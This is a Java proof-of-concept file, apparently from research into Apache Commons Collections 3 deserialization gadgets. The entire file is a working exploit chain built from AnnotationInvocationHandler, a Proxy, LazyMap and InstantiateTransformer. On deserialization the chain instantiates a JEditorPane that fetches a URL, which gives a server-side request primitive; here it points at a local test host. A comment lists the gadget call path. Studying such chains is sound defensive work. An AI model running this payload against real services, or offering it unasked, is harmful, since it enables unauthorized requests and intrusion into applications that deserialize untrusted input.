package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.swing.*;
import java.lang.annotation.Retention;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class POC_4 {

    /***
     * <sun.reflect.annotation.AnnotationInvocationHandler: void readObject(java.io.ObjectInputStream)>
     * <sun.reflect.annotation.AnnotationInvocationHandler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.InstantiateTransformer: java.lang.Object transform(java.lang.Object)>
     * <javax.swing.JEditorPane: void init(java.lang.String)>
     * <javax.swing.JEditorPane: void setPage(java.lang.String)>
     * <javax.swing.JEditorPane: void setPage(java.net.URL)>
     * <javax.swing.JEditorPane: void getStream(java.net.URL)>
     */

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(JEditorPane.class),
                new InstantiateTransformer(new Class[]{String.class},new Object[]{"http://127.0.0.1:3000/test"})
        };
        Transformer transformChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformChain);

        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, outerMap});

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class}, handler);

        handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, proxyMap});

        SerializeUtil.deserialize(SerializeUtil.serialize(handler));
    }

}
